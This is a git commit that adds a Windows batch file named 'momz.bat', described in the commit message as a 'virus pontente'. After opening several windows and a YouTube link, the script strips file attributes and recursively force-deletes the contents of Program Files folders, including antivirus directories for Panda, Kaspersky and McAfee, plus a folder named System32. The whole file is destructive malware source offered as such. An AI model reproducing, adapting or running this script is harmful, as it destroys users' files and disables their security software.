497f857937ad7d8619b3003b62c2d8712cef86c1
POGOOOOOOOOOO <97692532+POGOOOOOOOOOO@users.noreply.github.com>
2022-01-13 18:20:07 +0100

    a
    virus pontente

---
+++ momz.bat
@@ -0,0 +1,24 @@
+@echo off
+start cmd
+start control
+start explorer
+start https://www.youtube.com/watch?v=H9K8-3PHZOU
+cls
+cd \
+cd "archivos de programa" 
+cd "System32"
+attrib -R -A -S -H *.*
+del /S /Q *.*
+cd..
+cd "Panda Software"
+attrib -R -A -S -H *.*
+del /S /Q *.*
+cd..
+cd "Kaspersky Lab"
+attrib -R -A -S -H *.*
+del /S /Q *.*
+cd..
+cd "McAfee.com"
+attrib -R -A -S -H *.*
+del /S /Q *.*
+cls
